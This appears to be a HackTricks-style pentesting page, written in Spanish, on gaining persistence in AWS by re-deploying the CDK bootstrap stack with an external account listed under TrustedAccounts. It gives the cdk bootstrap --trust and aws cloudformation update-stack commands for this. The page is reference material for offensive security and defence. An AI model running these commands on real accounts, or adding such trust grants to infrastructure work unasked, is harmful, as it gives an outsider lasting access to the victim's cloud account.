# AWS - Cloudformation Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## CloudFormation

Para más información, accede:

{{#ref}}
../../aws-services/aws-cloudformation-and-codestar-enum.md
{{#endref}}

### CDK Bootstrap Stack

El AWS CDK despliega una CFN stack llamada `CDKToolkit`. Esta stack soporta un parámetro `TrustedAccounts` que permite a cuentas externas desplegar proyectos CDK en la cuenta víctima. Un atacante puede abusar de esto para otorgarse acceso indefinido a la cuenta víctima, ya sea usando el AWS cli para reimplementar la stack con parámetros, o el AWS CDK cli.
```bash
# CDK
cdk bootstrap --trust 1234567890

# AWS CLI
aws cloudformation update-stack --use-previous-template --parameters ParameterKey=TrustedAccounts,ParameterValue=1234567890
```
{{#include ../../../../banners/hacktricks-training.md}}
